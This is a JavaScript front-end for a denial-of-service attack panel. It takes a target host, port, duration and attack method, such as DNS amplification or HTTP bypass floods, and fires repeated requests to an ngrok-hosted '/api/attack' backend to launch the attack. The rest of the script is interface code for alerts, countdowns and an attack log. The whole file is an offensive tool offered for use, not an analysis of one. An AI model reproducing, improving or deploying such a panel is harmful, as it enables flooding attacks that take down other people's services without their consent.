document.getElementById('attack-button').addEventListener('click', function() {
    const host = document.getElementById('host').value;
    const port = parseInt(document.getElementById('port').value);
    const time = parseInt(document.getElementById('time').value);
    const method = document.getElementById('method').value;
    const concurrents = parseInt(document.getElementById('concurrents').value);

    const ngrokUrl = 'https://suitably-meet-sawfish.ngrok-free.app/api/attack';  // Atualize para o endereço correto

    // Envia múltiplas requisições conforme o valor de 'concurrents'
    for (let i = 0; i < concurrents; i++) {
        axios.get(`${ngrokUrl}?host=${host}&port=${port}&time=${time}&method=${method}`)
            .then(response => {
                showAlert('Attack initiated successfully', 'success');
                const logRow = updateLog(host, port, method, time, `Running: ${time}s`);
                startCountdown(time, logRow);
            })
            .catch(error => {
                showAlert('An error occurred: ' + error, 'danger');
            });
    }
});

// Função para iniciar contagem regressiva
function startCountdown(seconds, logRow) {
    const countdownElement = logRow.querySelector('.log-status');
    countdownElement.innerText = `Running: ${seconds}s`;

    const interval = setInterval(() => {
        seconds--;
        countdownElement.innerText = `Running: ${seconds}s`;
        if (seconds <= 0) {
            clearInterval(interval);
            countdownElement.innerText = 'Expired';
        }
    }, 1000);
}

// Função para exibir alertas
function showAlert(message, type) {
    const alertContainer = document.getElementById('alert-container');
    const alertBox = document.createElement('div');
    alertBox.className = `alert alert-${type}`;
    alertBox.textContent = message;
    alertContainer.appendChild(alertBox);

    setTimeout(() => {
        alertBox.remove();
    }, 3000);
}

// Função para atualizar o log
function updateLog(host, port, method, time, status) {
    const logEntries = document.getElementById('log-entries');
    const logRow = document.createElement('tr');
    logRow.innerHTML = `<td>${host}</td><td>${port}</td><td>${method}</td><td class="log-status">${status}</td>`;
    logEntries.appendChild(logRow);
    return logRow;
}

// Função para atualizar as opções do campo "Method" com base no protocolo selecionado
document.getElementById('protocol').addEventListener('change', function() {
    const protocol = this.value;
    const methodSelect = document.getElementById('method');
    methodSelect.innerHTML = '';

    let options = [];
    if (protocol === 'amplification') {
        options = ['DNS', 'TCPMB'];
    } else if (protocol === 'Layer7') {
        options = ['HTTPBYPASS', 'TLS', 'SITEBROWSER', 'SITEBEACH', 'HTTP1', 'HTTP2'];
    }

    options.forEach(option => {
        const opt = document.createElement('option');
        opt.value = option;
        opt.textContent = option;
        methodSelect.appendChild(opt);
    });
});

// Inicializar opções de Method com o valor padrão do protocolo selecionado
document.getElementById('protocol').dispatchEvent(new Event('change'));
